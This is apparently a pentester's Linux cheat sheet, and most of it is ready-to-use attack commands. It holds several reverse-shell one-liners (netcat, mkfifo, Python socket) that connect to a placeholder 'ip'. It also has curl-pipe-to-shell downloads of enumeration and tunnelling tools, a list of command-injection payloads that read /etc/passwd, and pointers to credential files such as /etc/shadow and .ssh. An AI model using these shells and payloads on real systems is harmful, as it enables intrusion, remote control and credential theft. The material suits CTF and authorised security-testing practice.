# 🐧 Linux

- [Auto Script](#auto-script)
- [Command Injection](#command-injection)
- [File Enumeration](#file-enumeration)
- [Gdbserver](#gdbserver)
- [Port Forwarding](#port-forwarding)
- [Reverse Shell](#reverse-shell)
- [SCP](#scp)
- [Sudo](#sudo)

## Sudo
```
sudo -l
```

## Auto Script
```
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

## Reverse Shell
### Server
```
nc -lp 4444
```
### reSH
```
# Client
resh ip 4444
# Server
resh 4444
```
[Source](/scripts/resh.py)

### Netcat
```
nc ip 4444 -e /bin/bash
```

### Mkfifo
```
mkfifo /tmp/f;nc ip 4444 0</tmp/f|/bin/sh -i 2>&1|tee /tmp/f
```

### Python
```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ip",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### TTY Support
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

*[source](https://github.com/acole76/pentestmonkey-cheatsheets/blob/master/shells.md)*

## SCP
### Download File
```
scp -P port user@192.168.1.ip:path .
```

### Upload File
```
scp -P port file user@192.168.1.ip:path
```

### Upload peda
```
scp -P 22 -r ~/.peda user@192.168.1.ip:/tmp/peda
```

## Gdbserver
*Port: 1337*
```
$ gdb
(gdb) target extended-remote ip:port
(gdb) remote get remote_file local_file
(gdb) remote put local_file remote_file
```

## File Enumeration
### Classic
- `/etc/passwd`  &  `/etc/shadow`
- `/www/html` ꞏ `/var/www` ꞏ `/srv/html` ꞏ `/usr/share/*`
- `/home/user/.ssh`
- `/etc/cron.d`
- `/opt/`

### Proc
`/proc/` contains useful information about the processes that are currently running

| directory	          | description                                     |
|---------------------|-------------------------------------------------|
| `/proc/PID/cmdline` | Command line arguments.                         |
| `/proc/PID/cwd`     | Link to the current working directory.          |
| `/proc/PID/environ` | Values of environment variables.                |
| `/proc/PID/exe`     | Link to the executable of this process.         |
| `/proc/PID/fd`      | Directory, which contains all file descriptors. |

### Command

```
find / -user user 2>&-
find / -group group 2>&-
find / -user root -executable -type f 2>&- | grep -v /bin/
```

## Script
```
curl "https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh" -Lo lse.sh
chmod +x lse.sh
./lse.sh -l1
```

## Command Injection
```bash
;{cat,/etc/passwd}
;cat${IFS}/etc/passwd;
; cat /etc/passwd ;
$(cat /etc/passwd)
`cat /etc/passwd`
&& cat /etc/passwd &&
|| cat /etc/passwd ||
< <(cat /etc/passwd)
| cat /etc/passwd
"; cat /etc/passwd "
```
[GTFOBins - Bypass  local security restrictions](https://gtfobins.github.io/)


## Port Forwarding

### Chisel

```
# Install chisel

curl https://i.jpillora.com/chisel! | bash
```

```bash
# Example: 8000 -> 4444

# Attacker machine:
$> chisel server -p 4444 --reverse

# Victim machine:
$> ./chisel client ip-server:4444 R:8000:127.0.0.1:8000
```

### SSH
```sh
ssh -L 8080:127.0.0.1:8080 user@ip
```
